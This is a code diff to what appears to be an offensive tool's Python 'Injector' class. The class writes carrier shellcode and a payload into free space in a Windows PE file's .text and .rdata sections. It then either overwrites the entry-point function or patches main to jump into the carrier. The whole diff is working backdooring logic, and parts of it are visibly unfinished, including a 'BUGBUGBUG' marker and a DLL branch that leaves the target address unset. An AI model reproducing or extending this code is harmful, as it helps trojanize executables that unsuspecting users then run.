@@ -2,7 +2,7 @@ from helper import *
 import logging
 import time
 import logging
-from typing import Dict, List
+from typing import Dict, List, Tuple
 
 from model.injectable import Injectable, DataReuseEntry, DataReuseReference
 from pe.pehelper import *
@@ -44,76 +44,97 @@ class Injector():
 
         self.payload_rva: int = 0
         self.carrier_rva: int = 0
-        self.init_addresses()
 
 
-    def init_addresses(self):
-        if self.settings.payload_location == PayloadLocation.CODE:
-            #. text                                                     
-            # ┌───────────┬─────────────────────────────────────┬───────┐
-            # │           ├────────┼────────┼───────────────────┤       │
-            # │           │Carrier │ 1 Page │ Payload           │       │
-            # │           ├────────┼────────┼───────────────────┤       │
-            # └───────────┴─────────────────────────────────────┴───────┘
-            #
-            # Payload is page aligned when used with dll_loader_change
+    # ┌───────────┬─────────────────────────────────────┬───────┐
+    # │           ├────────┼────────┼───────────────────┤       │
+    # │           │Carrier │ 1 Page │ Payload           │       │
+    # │           ├────────┼────────┼───────────────────┤       │
+    # └───────────┴─────────────────────────────────────┴───────┘
+    #
+    #  .text                          .rdata                     
+    # ┌─────────┬─────────┬───────┐  ┌────────┬─────────┬───────┐
+    # │         │         │       │  │        │         │       │
+    # │         │ carrier │       │  │        │payload  │       │
+    # │         │         │       │  │        │         │       │
+    # └─────────┴─────────┴───────┘  └────────┴─────────┴───────┘
 
-            # carrier location
-            complete_size = len(self.carrier_shc) + 4096 + len(self.payload.payload_data)
-            largest_gap = self.code_manager.find_holes(complete_size)
-            if len(largest_gap) == 0:
-                raise Exception('No hole found in code section to fit payload!')
-            largest_gap_size = largest_gap[0][1] - largest_gap[0][0]
-            offset = int((largest_gap_size - complete_size) / 2)  # centered in the .text section
-            offset += largest_gap[0][0]
-            self.carrier_rva = self.superpe.get_code_section().VirtualAddress + offset
+    # Backdoor
+    def get_random_data_payload_rva(self) -> int:
+        complete_size = len(self.payload.payload_data)
+        largest_gap = self.rdata_manager.find_holes(complete_size)
+        if len(largest_gap) == 0:
+            raise Exception('No hole found in code section to fit payload!')
+        largest_gap_size = largest_gap[0][1] - largest_gap[0][0]
+        offset = largest_gap[0][0]
 
-            # payload location: behind carrier + 1 page
-            if self.settings.carrier_name == "dll_loader_change":
-                self.payload_rva = self.carrier_rva + len(self.carrier_shc) + 4096 + 4096
-                self.payload_rva = self.payload_rva & 0xFFFFF000 # page align
-            else:
-                # no page align
-                self.payload_rva = self.carrier_rva + len(self.carrier_shc) + 4096
+        rdata_section = self.superpe.get_section_by_name(".rdata")
+        if rdata_section == None:
+            raise Exception("No .rdata section found in PE file")
+        self.rdata_manager.add_range(offset, offset+len(self.payload.payload_data))
+
+        payload_rva = rdata_section.virt_addr + offset
+        #self.payload_rva = payload_rva
+        return payload_rva
+    
+
+    # Backdoor
+    def get_random_code_carrier_rva(self) -> int:
+        complete_size = len(self.carrier_shc)
+        largest_gap = self.code_manager.find_holes(complete_size)
+        if len(largest_gap) == 0:
+            raise Exception('No hole found in code section to fit payload!')
+        largest_gap_size = largest_gap[0][1] - largest_gap[0][0]
+        offset = int((largest_gap_size - complete_size) / 2)  # centered in the .text section
+        offset += largest_gap[0][0]
+        carrier_rva = self.superpe.get_code_section().VirtualAddress + offset
+        return carrier_rva
+        
+
+    # Backdoor
+    def get_random_carrier_and_payload_rva_in_code(self) -> Tuple[int, int]:
+        complete_size = len(self.carrier_shc) + 4096 + len(self.payload.payload_data)
+        largest_gap = self.code_manager.find_holes(complete_size)
+        if len(largest_gap) == 0:
+            raise Exception('No hole found in code section to fit payload!')
+        largest_gap_size = largest_gap[0][1] - largest_gap[0][0]
+        offset = int((largest_gap_size - complete_size) / 2)  # centered in the .text section
+        offset += largest_gap[0][0]
+        carrier_rva = self.superpe.get_code_section().VirtualAddress + offset
+
+        # payload location: behind carrier + 1 page
+        if self.settings.carrier_name == "dll_loader_change":
+            payload_rva = carrier_rva + len(self.carrier_shc) + 4096 + 4096
+            payload_rva = payload_rva & 0xFFFFF000 # page align
         else:
-            #  .text                          .rdata                     
-            # ┌─────────┬─────────┬───────┐  ┌────────┬─────────┬───────┐
-            # │         │         │       │  │        │         │       │
-            # │         │ carrier │       │  │        │payload  │       │
-            # │         │         │       │  │        │         │       │
-            # └─────────┴─────────┴───────┘  └────────┴─────────┴───────┘
+            # no page align
+            payload_rva = carrier_rva + len(self.carrier_shc) + 4096
 
-            # carrier location
-            complete_size = len(self.carrier_shc)
-            largest_gap = self.code_manager.find_holes(complete_size)
-            if len(largest_gap) == 0:
-                raise Exception('No hole found in code section to fit payload!')
-            largest_gap_size = largest_gap[0][1] - largest_gap[0][0]
-            offset = int((largest_gap_size - complete_size) / 2)  # centered in the .text section
-            offset += largest_gap[0][0]
-            self.carrier_rva = self.superpe.get_code_section().VirtualAddress + offset
+        return payload_rva, carrier_rva
+    
 
-            # payload location
-            complete_size = len(self.payload.payload_data)
-            largest_gap = self.rdata_manager.find_holes(complete_size)
-            if len(largest_gap) == 0:
-                raise Exception('No hole found in code section to fit payload!')
-            largest_gap_size = largest_gap[0][1] - largest_gap[0][0]
-            offset = largest_gap[0][0]
+    # Overwrite
+    def get_func_carrier_and_payload_rva_in_code(self) -> Tuple[int, int]:
+        func_addr = self.superpe.get_entrypoint()
 
-            rdata_section = self.superpe.get_section_by_name(".rdata")
-            if rdata_section == None:
-                raise Exception("No .rdata section found in PE file")
-            self.payload_rva = rdata_section.virt_addr + offset
-            self.rdata_manager.add_range(offset, offset+len(self.payload.payload_data))
+        carrier_rva = func_addr
+        payload_rva = carrier_rva + len(self.carrier_shc)
 
+        return payload_rva, carrier_rva
+    
+
+    # Overwrite
+    def get_func_code_carrier_rva(self) -> int:
+        func_addr = self.superpe.get_entrypoint()
+        carrier_rva = func_addr
+        return carrier_rva
+        
 
     ## Inject
-
+    
     def inject_exe(self):
         exe_in = self.settings.get_inject_exe_in()
         exe_out = self.settings.get_inject_exe_out()
-        carrier_invoke_style: CarrierInvokeStyle = self.settings.carrier_invoke_style
 
         logger.info("-[ Injecting Carrier into injectable".format())
         logger.info("    Injectable: {} -> {}".format(exe_in, exe_out))
@@ -125,58 +146,49 @@ class Injector():
         carrier_shc_len = len(self.carrier_shc)
         carrier_offset: int = 0  # file offset
 
-        # Special case: DLL exported function direct overwrite
-        if self.superpe.is_dll() and self.settings.dllfunc != "" and carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
-            logger.info("      Inject DLL: Overwrite exported function {} with shellcode".format(self.settings.dllfunc))
-            rva = self.superpe.getExportEntryPoint(self.settings.dllfunc)
+        if self.settings.carrier_invoke_style == CarrierInvokeStyle.OverwriteFunc:
+            if self.settings.payload_location == PayloadLocation.CODE:
+                # Carrier and Payload both in .text section in a function
+                self.payload_rva, self.carrier_rva = self.get_func_carrier_and_payload_rva_in_code()
+            elif self.settings.payload_location == PayloadLocation.DATA:
+                # Carrier in a function, Payload random in data section
+                self.carrier_rva = self.get_func_code_carrier_rva() ### BUGBUGBUG
+                self.payload_rva = self.get_random_data_payload_rva()
 
-            # Size and sanity checks
-            function_size = self.superpe.get_size_of_exported_function(self.settings.dllfunc)
-            if carrier_shc_len >= function_size:
-                logger.warning("        Oups, Shellcode larger than function {}: {} > {}. Continue anyway.".format(
-                    self.settings.dllfunc, carrier_shc_len, function_size
-                ))
-
-            # Inject
-            carrier_offset = self.superpe.get_offset_from_rva(rva)
-            logger.info(f'-      Using DLL Export "{self.settings.dllfunc}" at RVA 0x{rva:X} offset 0x{carrier_offset:X} to overwrite')
-            self.superpe.pe.set_bytes_at_offset(carrier_offset, self.carrier_shc)
-
-        else:  # EXE/DLL
+            # copy carrier shellcode into the code section (at func)
             carrier_offset = self.superpe.get_offset_from_rva(self.carrier_rva)
-            #logger.info("{} {}".format(self.carrier_rva, carrier_offset))
+            self.superpe.pe.set_bytes_at_offset(carrier_offset, self.carrier_shc)
             logger.info("    Inject: Write Carrier to 0x{:X} (0x{:X})".format(
                 self.carrier_rva, carrier_offset))
 
-            # Copy the carrier
+        elif self.settings.carrier_invoke_style == CarrierInvokeStyle.BackdoorFunc:
+            if self.settings.payload_location == PayloadLocation.CODE:
+                # Carrier and Payload depend on each other (both are in .text)
+                self.payload_rva, self.carrier_rva = self.get_random_carrier_and_payload_rva_in_code()
+            elif self.settings.payload_location == PayloadLocation.DATA:
+                # Carrier and Payload are independent
+                self.payload_rva = self.get_random_data_payload_rva()
+                self.carrier_rva = self.get_random_code_carrier_rva()
+
+            # copy carrier shellcode into the code section
+            carrier_offset = self.superpe.get_offset_from_rva(self.carrier_rva)
             self.superpe.pe.set_bytes_at_offset(carrier_offset, self.carrier_shc)
+            logger.info("    Inject: Write Carrier to 0x{:X} (0x{:X})".format(
+                self.carrier_rva, carrier_offset))
 
-            # rewire flow to the carrier
-            if self.superpe.is_dll() and self.settings.dllfunc != "":  # DLL
-                if carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
-                    # Handled above
-                    raise Exception("We should not land here")
+            # backdoor the function (usually main())
+            backdoor_func_addr: int = None
+            if self.settings.dllfunc == "":
+                backdoor_func_addr = self.superpe.get_entrypoint()
+            else:
+                pass
+            logger.info("    Backdoor function {} (0x{:X})".format(
+                self.settings.dllfunc, backdoor_func_addr))
+            self.function_backdoorer.backdoor_function(
+                backdoor_func_addr, self.carrier_rva, carrier_shc_len)
+        
 
-                elif carrier_invoke_style == CarrierInvokeStyle.BackdoorCallInstr:
-                    addr = self.superpe.getExportEntryPoint(self.settings.dllfunc)
-                    logger.info("      Backdoor DLL {} (0x{:X})".format(
-                        self.settings.dllfunc, addr))
-                    self.function_backdoorer.backdoor_function(
-                        addr, self.carrier_rva, carrier_shc_len)
-
-            else: # EXE
-                if carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
-                    logger.info("    Change Entry Point to 0x{:X}".format(
-                        self.carrier_rva))
-                    self.superpe.set_entrypoint(self.carrier_rva)
-
-                elif carrier_invoke_style == CarrierInvokeStyle.BackdoorCallInstr:
-                    addr = self.superpe.get_entrypoint()
-                    logger.info("    Backdoor function at entrypoint (0x{:X})".format(
-                        addr))
-                    self.function_backdoorer.backdoor_function(
-                        addr, self.carrier_rva, carrier_shc_len)
-
+        # Make the injected carrier work, integrate it into the PE
         self.injectable_write_iat_references()
         self.inject_and_reference_data()
 
